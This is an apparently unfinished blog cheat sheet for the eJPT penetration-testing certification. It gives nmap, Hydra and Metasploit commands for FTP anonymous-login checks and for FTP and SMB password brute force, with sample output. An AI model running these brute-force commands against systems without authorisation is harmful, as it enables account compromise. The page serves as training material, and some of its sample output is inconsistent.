---
title: "eJPT Cheat Sheet"
date: 2026-05-29 18:00:00 -0600
categories: [eJPT]
tags: [eJPT]

image:
    path: /assets/img/samples/another/ejpt.png
    alt: eJPT
---

## Test




# Services

## FTP

### Anonymous Auth

**nmap**
```shell
nmap -p21 --script ftp-anon <ip>
```
**Metasploit-Framework**
```shell
msf > use auxiliary/scanner/ftp/ftp_anonymous
msf auxiliary(scanner/ftp/ftp_anonymous) > set RHOSTS <ip>
RHOSTS => 
[*] Auxiliary module execution completed
msf auxiliary(scanner/ftp/ftp_anonymous) > run
[+] 10.0.0.1:21       - Anonymous Read-only access ()
[*] 10.0.0.1:21       - Scanned 1 of 1 hosts (100% complete)
```



### Brute force

**Hydra**

```shell
❯ hydra -l <user> -P /usr/share/wordlists/rockyou.txt <ip> ftp -t 4
```

**Metasploit-Framework**

`auxiliary/scanner/ftp/ftp_login`

```shell
msf > use auxiliary/scanner/ftp/ftp_login
msf auxiliary(scanner/ftp/ftp_login) > set RHOSTS <ip>
RHOSTS => 
smsf auxiliary(scanner/ftp/ftp_login) > set USERNAME <user>
USERNAME => ftpuser
msf auxiliary(scanner/ftp/ftp_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
PASS_FILE => /usr/share/wordlists/rockyou.txt
msf auxiliary(scanner/ftp/ftp_login) > set VERBOSE false
VERBOSE => false
msf auxiliary(scanner/ftp/ftp_login) > run
[*] 10.0.0.1:21       - 10.0.0.1:21 - Starting FTP login sweep
[+] 10.0.0.1:21       - 10.0.0.1:21 - Login Successful: user:pass
[*] 192.168.0.78:21       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```


## SMTP

## DNS

## HTTP

## SMB

```shell
❯ nmap -sCV -p445 <ip>
```

### Brute Force

**Hydra**
```shell
❯ hydra -l <user> -P /usr/share/wordlists/rockyou.txt <ip> smb2
```


**Metasploit-Framework**

`auxiliary/scanner/smb/smb_login`
```shell
msf > use auxiliary/scanner/smb/smb_login
msf auxiliary(scanner/smb/smb_login) > set RHOSTS <ip>
RHOSTS =>
msf auxiliary(scanner/smb/smb_login) > set SMBUser <user>
SMBUser =>
msf auxiliary(scanner/smb/smb_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
PASS_FILE =>
msf auxiliary(scanner/smb/smb_login) > set VERBOSE false
VERBOSE => false
msf auxiliary(scanner/smb/smb_login) > run
[+] 10.0.0.1:445     - 10.0.0.1:445     - Success: '.\user:pass'
[*] 10.0.0.1:445     - Scanned 1 of 1 hosts (100% complete)
[*] 10.0.0.1:445     - Bruteforce completed, 1 credential was successful.
[*] 10.0.0.1:445     - You can open an SMB session with these credentials and CreateSession set to true
[*] Auxiliary module execution completed
```



## MySQL

## RDP

## WinRM



